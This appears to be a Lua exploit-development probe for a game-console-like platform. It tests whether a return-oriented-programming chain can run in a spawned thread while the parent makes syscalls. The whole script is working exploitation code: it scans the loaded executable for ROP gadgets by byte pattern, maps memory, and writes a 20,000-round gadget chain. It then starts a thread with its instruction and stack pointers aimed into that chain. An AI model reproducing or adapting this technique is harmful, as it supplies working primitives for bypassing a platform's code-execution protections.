-- CRASH_CLASS: HIGH
-- PROBE 1043a: concurrency gate.  Every Lua syscall goes through one shared pivot chain
-- (native.lua:158 setup_pivot_handler), so two Lua callers clobber each other (1042e).
-- A thr_create child does NOT use that pivot: its chain calls syscall.pipe.fn_addr straight
-- from its own stack.  Question: can a child's long unrolled chain run while the parent is
-- inside the Lua syscall path?
--
-- Chain layout per round: {pop_rax, 20, fn} - fn is the libkernel wrapper the loader uses
-- for every syscall (rax = number, args in rdi/rsi/rdx).  20000 rounds = 480 KB of words.
print("=== PROBE 1043a: native chain concurrency gate ===")
local ROUNDS = 20000
local PLUA = 50000
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
local okS, sadr = pcall(function() return to_num(syscall.syscall_address) end)
print(string.format("[0] fn=%08X syscall_address=%s ok=%s", fn, okS and string.format("%08X", sadr) or "?", tostring(okS)))
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
if fn == 0 then print("[!] no fn"); return end

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X poprax=%s poprdi=%s store=%s jmp=%s",
    ebase, tostring(pop_rax), tostring(pop_rdi), tostring(store), tostring(jmp_g)))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] gadget missing"); return end

local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a); if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RAX = 0x078 }
local STACK = 0x100000
local block = mmap(STACK)
local res = mmap(0x4000)
print(string.format("[A] block=%08X res=%08X", block, res))
if block == 0 or res == 0 then print("[!] mmap failed"); return end

local start = block + 0x4000
local function put(i, v) wq(start + 8 + i * 8, uint64(v)) end
local n = 0
for r = 1, ROUNDS do
    put(n, pop_rax); put(n + 1, 20); put(n + 2, fn); n = n + 3
end
put(n, pop_rdi); put(n + 1, res); put(n + 2, pop_rax); put(n + 3, 20); put(n + 4, fn); put(n + 5, store); n = n + 6
put(n, pop_rdi); put(n + 1, 0); put(n + 2, pop_rax); put(n + 3, 431); put(n + 4, fn); put(n + 5, jmp_g); n = n + 6
print(string.format("[B] chain words=%d bytes=%d head=%08X", n, n * 8, start))

local ctx = memory.alloc(0x500); zero(ctx, 0x500)
wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8))
wq(ctx + Ctx.RAX, uint64(20))   -- the entry call IS a syscall: rax=0 is the indirect form
local tb = memory.alloc(8); wq(tb, uint64(0))
local t0 = os.time()
local oksp, rvsp = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
local tid = rd(tb) or 0
print(string.format("[S] spawn ok=%s rv=%s tid=%d", tostring(oksp), tostring(to_num(rvsp)), tid))
if not oksp then print("[!] spawn failed"); return end

-- parent: same syscall (getpid) in Lua while the child is running its chain
local n_ok, n_err = 0, 0
local gpid = mk(20)
local t_start = os.clock()
for i = 1, PLUA do
    local ok, v = pcall(function() return gpid(uint64(0)) end)
    if ok then n_ok = n_ok + 1 else n_err = n_err + 1; break end
end
local dt = os.clock() - t_start
print(string.format("[P] lua ok=%d err=%d dt=%.2f", n_ok, n_err, dt))
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 50000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
print(string.format("[C] child res=%d (pid=%d) alive=%s", rd(res) or -1,
    to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)), "yes"))
print("[Z] done")
